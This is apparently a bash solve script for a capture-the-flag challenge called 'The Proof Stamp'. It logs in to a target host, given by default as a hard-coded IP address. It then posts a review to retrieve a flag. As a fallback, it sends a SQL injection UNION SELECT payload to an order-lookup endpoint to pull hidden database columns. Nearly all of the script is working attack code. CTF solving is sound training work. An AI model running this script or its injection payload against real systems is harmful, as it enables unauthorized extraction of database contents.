#!/usr/bin/env bash
# solve-proof-stamp.sh — riffhack "The Proof Stamp"
#
# POST /api/reviews accepts an allow-listed filename and stamps a hard-coded
# value into the row's `fileHash` column on every insert. That hard-coded
# value is the flag — no upload, no hash check.
#
# Usage: solve-proof-stamp.sh <host>
set -euo pipefail

HOST="${1:-159.89.230.27}"
HERE="$(cd "$(dirname "$0")" && pwd)"
# shellcheck disable=SC1091
source "$HERE/lib/login.sh"

echo "[*] Proof Stamp (server-stamped fileHash) against $HOST"

COOKIE=$(login "$HOST")

echo "[*] POST /api/reviews with allow-listed filename"
resp=$(curl -sk -b "$COOKIE" -X POST -H 'Content-Type: application/json' \
  -d '{"reviewText":"works great","filename":"exploitation_proof.png","listingId":"macro-builder"}' \
  "http://$HOST/api/reviews")

echo "[*] response:"
printf '%s\n' "$resp" | python3 -m json.tool 2>/dev/null || printf '%s\n' "$resp"

flag=$(printf '%s\n' "$resp" | grep -oE 'bitflag\{[^}]+\}' | head -1)

# Fallback: if POST handler is broken on this deployment, pull the fileHash
# via the web3 SQLi pivot off any user-created Review row.
if [[ -z "$flag" ]]; then
  echo "[!] POST didn't return a flag; falling back to web3 SQLi pivot on Review.fileHash"
  resp=$(curl -sk -b "$COOKIE" --data-urlencode \
    "ref=' UNION SELECT id,filename,0,listingId,fileHash,createdAt
          FROM Review WHERE id NOT LIKE 'seed-%' LIMIT 1 --" \
    -G "http://$HOST/api/orders/lookup")
  flag=$(printf '%s\n' "$resp" | grep -oE 'bitflag\{[^}]+\}' | head -1)
fi

if [[ -n "$flag" ]]; then
  echo "[+] FLAG: $flag"
else
  echo "[-] no flag from either path" >&2
  exit 1
fi
